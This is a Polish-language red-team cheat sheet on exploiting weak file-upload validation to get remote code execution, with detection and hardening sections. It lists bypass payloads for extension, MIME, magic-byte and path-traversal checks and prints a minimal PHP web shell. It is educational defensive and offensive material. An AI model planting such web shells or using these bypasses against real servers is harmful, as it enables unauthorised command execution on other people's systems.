---
title: "Podatności file upload"
category: "red-team"
tags: ["web", "file-upload", "rce"]
platform: "web"
mitre: ["T1190"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# File Upload → RCE

## TL;DR
Słaba walidacja uploadu → wgranie web shella (np. `.php`) i wykonanie kodu. Omijanie: rozszerzenia, MIME, magic bytes, path traversal.

## Techniki omijania
```text
Rozszerzenia:  shell.php.jpg  shell.pHp  shell.phtml  shell.php5  shell.php%00.jpg
MIME:          zmień Content-Type na image/png (a treść to PHP)
Magic bytes:   GIF89a; <?php system($_GET['c']); ?>
Double ext:    .jpg.php
Path traversal: filename="../../shell.php"
.htaccess:     wgraj .htaccess mapujący .xyz -> php
```

## Minimalny web shell (test w labie)
```php
<?php system($_GET['cmd']); ?>
```

## Wykrywanie (Blue Team)
- Pliki wykonywalne w katalogach uploadu, dostęp do świeżo wgranych `.php`.
- WAF: sygnatury web shelli, anomalne parametry `cmd=`.
- FIM na katalogach uploadu.

## Mitygacja / Hardening
- Allow-list rozszerzeń + weryfikacja treści (magic bytes), rename losowy.
- Przechowuj uploady **poza web root** / w storage bez wykonywania (S3, `X-Content-Type-Options`).
- Wyłącz wykonywanie w katalogu uploadu (brak handlera PHP), skanowanie AV.

## Źródła
- [OWASP – Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
